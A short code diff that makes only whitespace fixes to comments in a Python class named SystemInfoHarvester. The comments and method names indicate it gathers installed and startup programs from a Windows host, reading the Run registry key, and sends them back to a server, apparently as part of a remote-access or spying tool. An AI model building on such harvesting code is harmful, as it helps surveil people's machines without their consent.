@@ -142,7 +142,7 @@ class SystemInfoHarvester:
                 return software_list
 
 
-        #extracts installed apps and sends back to server
+        # extracts installed apps and sends back to server
         def send_installed_apps(self, conn):
             result = []
 
@@ -508,7 +508,7 @@ class SystemInfoHarvester:
         # ============================Network Information Extraction==============================
 
 
-        #extracts startup apps and sends back to server
+        # extracts startup apps and sends back to server
         def get_user_startup_programs(self, conn):
             registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             startup_programs = []
